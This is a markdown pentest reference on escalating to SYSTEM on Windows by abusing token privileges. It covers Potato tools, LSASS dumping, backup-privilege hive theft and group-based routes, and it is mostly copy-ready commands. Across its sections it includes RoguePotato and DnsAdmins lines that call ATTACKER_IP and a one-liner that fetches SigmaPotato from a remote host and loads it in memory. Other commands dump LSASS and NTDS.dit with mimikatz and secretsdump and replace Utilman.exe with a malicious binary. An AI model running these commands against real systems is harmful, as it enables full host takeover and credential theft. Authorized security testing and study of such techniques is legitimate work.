# Windows Token Privileges & Potato Attacks

Deep reference for abusing Windows access-token privileges to reach `NT AUTHORITY\SYSTEM` — the single most common Windows privesc path on modern systems (service accounts, IIS app pools, MSSQL, scheduled jobs all hold `SeImpersonatePrivilege`). Companion to `windows-privesc-methodology.md`.

---

## 1. Enumerate Privileges

```cmd
whoami /priv
```
Disabled privileges still count — many tools enable them at runtime. The high-value ones:

| Privilege | Held by (typical) | Escalation |
|-----------|-------------------|------------|
| **SeImpersonatePrivilege** | service accounts, IIS `IIS APPPOOL\*`, `mssql`, `LOCAL SERVICE`, `NETWORK SERVICE` | **Potato** → SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | some services | Potato variants → SYSTEM |
| **SeDebugPrivilege** | admins, some services | open/inject any process; dump LSASS; migrate to SYSTEM |
| **SeBackupPrivilege** | Backup Operators | read SAM/SYSTEM/NTDS → offline hashes |
| **SeRestorePrivilege** | Backup/Server Operators | overwrite protected files / service binaries |
| **SeTakeOwnershipPrivilege** | admins | take ownership of a SYSTEM file, replace |
| **SeLoadDriverPrivilege** | some operators | load vulnerable driver (BYOVD) → kernel |
| **SeManageVolumePrivilege** | some services | gain full write to `C:\` → DLL/binary plant |
| **SeCreateTokenPrivilege** | rare | craft a SYSTEM token directly |

---

## 2. SeImpersonate / SeAssignPrimaryToken → Potato Attacks

All "Potato" attacks abuse the ability to **impersonate** a token. The technique: coerce a SYSTEM-context service to authenticate to a local listener you control, capture/relay that authentication, impersonate the resulting SYSTEM token, and spawn a process. Pick the Potato based on OS and which services/pipes are available.

### 2.1 Tool selection matrix (2025)

| Tool | Mechanism | Works when | Notes |
|------|-----------|-----------|-------|
| **PrintSpoofer** | MS-RPRN / `\pipe\spoolss` named pipe | Print Spooler running | Simplest; fails if Spooler disabled (post-PrintNightmare hardening) |
| **GodPotato** | DCOM → RPC/OXID over any Windows version | Win8–Win11, Server 2012–2022 | Most reliable modern choice; needs .NET |
| **SigmaPotato** | GodPotato fork | modern Windows | In-memory/.NET reflection, extended OS support |
| **RoguePotato** | OXID resolver redirect (port 135 → remote) | Win10/Server2019 | Needs a redirector if outbound 135 blocked |
| **EfsPotato / SharpEfsPotato** | MS-EFSR (`lsarpc`/`efsrpc`/`samr`/`lsass`/`netlogon` pipes) | EFS RPC reachable | Try alternate pipes if one is blocked |
| **DCOMPotato** | DCOM service (PrintNotify/McpManagement) | services default-enabled | Good when Spooler off |
| **JuicyPotato / JuicyPotatoNG** | BITS/DCOM CLSID | Server 2016/2019, older Win10 | Patched on newer builds; JuicyPotatoNG revives some cases |

> Rule of thumb: try **PrintSpoofer** first (if Spooler up), else **GodPotato/SigmaPotato**, else **EfsPotato** (cycle pipes), else **RoguePotato/DCOMPotato/JuicyPotatoNG**.

### 2.2 Commands
```cmd
:: PrintSpoofer — interactive SYSTEM shell
PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -c "C:\Windows\Temp\rev.exe"
PrintSpoofer64.exe -d 1 -c "cmd /c whoami"          :: -d = session id

:: GodPotato (.NET 2/3.5/4 builds available)
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\Windows\Temp\rev.exe"

:: SigmaPotato (in-memory friendly)
SigmaPotato.exe "whoami"
:: PowerShell reflective load:
[Reflection.Assembly]::Load((iwr http://IP/SigmaPotato.exe -UseBasicParsing).Content); [SigmaPotato]::Main(@("whoami"))

:: EfsPotato / SharpEfsPotato (cycle pipes if blocked)
EfsPotato.exe "whoami" l            :: pipes: r=lsarpc, e=efsrpc, s=samr, n=netlogon, l=lsass
SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami > C:\out.txt"

:: RoguePotato (needs OXID redirector on 135 if outbound blocked)
RoguePotato.exe -r ATTACKER_IP -e "C:\Windows\Temp\rev.exe" -l 9999

:: DCOMPotato
DCOMPotato.exe                       :: spawns SYSTEM cmd via PrintNotify/McpManagement service

:: JuicyPotatoNG (older targets)
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
```

### 2.3 Verify
```cmd
:: in the spawned shell
whoami        :: nt authority\system
```

---

## 3. SeDebugPrivilege

Lets you open a handle to **any** process. Two uses: dump LSASS for credentials, or migrate/inject into a SYSTEM process.
```cmd
:: Dump LSASS (then secretsdump offline)
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\l.dmp
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\l.dmp full
:: Parse:
pypykatz lsa minidump l.dmp
mimikatz # sekurlsa::minidump l.dmp -> sekurlsa::logonpasswords

:: Spawn SYSTEM by abusing the privilege (e.g. psgetsystem / token theft)
:: PowerShell Get-System style or:
.\PsExec64.exe -s -i cmd            :: if admin already; SeDebug helps with token theft tooling
```
Mimikatz token elevation:
```
privilege::debug
token::elevate
```

---

## 4. SeBackupPrivilege / SeRestorePrivilege

`SeBackup` bypasses file DACLs for **reads**; `SeRestore` for **writes**. Backup Operators get both.
```cmd
:: Read SAM/SYSTEM via shadow copy or robocopy backup mode, then secretsdump:
reg save HKLM\SAM C:\Windows\Temp\sam
reg save HKLM\SYSTEM C:\Windows\Temp\system
:: With SeBackup but not admin, use diskshadow + robocopy /b to grab locked hives:
diskshadow /s script.txt           :: script creates a shadow, exposes it as a drive
robocopy /b X:\Windows\System32\config C:\Temp SAM SYSTEM
impacket-secretsdump -sam sam -system system LOCAL

:: On a DC: grab NTDS.dit + SYSTEM via shadow copy → DCSync-equivalent offline dump
diskshadow ...; robocopy /b X:\Windows\NTDS C:\Temp ntds.dit
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
PowerShell SeBackupPrivilege modules (`SeBackupPrivilegeUtils.dll` / `SeBackupPrivilegeCmdLets.dll`):
```powershell
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit -Overwrite
```
`SeRestore`: overwrite a SYSTEM-run binary (e.g. `utilman.exe`/`sethc.exe`) or a service exe, then trigger.

---

## 5. SeTakeOwnership / SeLoadDriver / SeManageVolume

```cmd
:: SeTakeOwnership: take a SYSTEM binary, grant yourself rights, replace it
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant %USERNAME%:F
copy /y evil.exe C:\Windows\System32\Utilman.exe     :: triggered at lock screen (Win+U)

:: SeLoadDriver: load a vulnerable signed driver (BYOVD) → kernel code exec
:: e.g. Capcom.sys / dbutil / RTCore64 via tooling (EoPLoadDriver, then exploit)

:: SeManageVolume: abuse to gain write to C:\ root, plant a DLL hijacked by a SYSTEM process
:: (SeManageVolumeExploit grants Users write to C:\, then DLL plant in a search path)
```

---

## 6. Group-Based SYSTEM Routes

| Group | Route |
|-------|-------|
| **Backup Operators** | SeBackup/SeRestore (above) → read SAM/NTDS |
| **Server Operators** | reconfigure a service binPath → SYSTEM |
| **Print Operators** | SeLoadDriver → BYOVD |
| **DnsAdmins** | `dnscmd /config /serverlevelplugindll \\IP\share\evil.dll` → restart DNS → SYSTEM on DC |
| **Hyper-V Administrators** | various VM/host abuses |
| **Event Log Readers** | read logs containing creds |

```cmd
:: DnsAdmins (on a DC)
dnscmd <DC> /config /serverlevelplugindll \\ATTACKER_IP\share\evil.dll
sc \\<DC> stop dns & sc \\<DC> start dns       :: needs restart rights; loads DLL as SYSTEM
```

---

## 7. Cheatsheet

```cmd
whoami /priv

:: SeImpersonate (most common)
PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
EfsPotato.exe "whoami" l

:: SeDebug
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\Temp\l.dmp full
pypykatz lsa minidump C:\Temp\l.dmp

:: SeBackup/SeRestore
diskshadow /s s.txt & robocopy /b X:\Windows\System32\config C:\T SAM SYSTEM
impacket-secretsdump -sam sam -system system LOCAL

:: SeTakeOwnership
takeown /f C:\Windows\System32\Utilman.exe & icacls ... /grant %USERNAME%:F & copy evil.exe ...

:: DnsAdmins
dnscmd <DC> /config /serverlevelplugindll \\IP\share\evil.dll
```

---

## References

- HackTricks – Abusing Tokens — https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- HackTricks – RoguePotato/PrintSpoofer/SharpEfsPotato/GodPotato — https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html
- PrintSpoofer (itm4n) — https://github.com/itm4n/PrintSpoofer
- GodPotato — https://github.com/BeichenDream/GodPotato
- SigmaPotato — https://github.com/tylerdotrar/SigmaPotato
- EfsPotato / SharpEfsPotato — https://github.com/zcgonvh/EfsPotato , https://github.com/bugch3ck/SharpEfsPotato
- RoguePotato — https://github.com/antonioCoco/RoguePotato
- DCOMPotato — https://github.com/zcgonvh/DCOMPotato
- JuicyPotatoNG — https://github.com/antonioCoco/JuicyPotatoNG
- SeBackupPrivilege / SeRestore abuse — https://github.com/giuliano108/SeBackupPrivilege
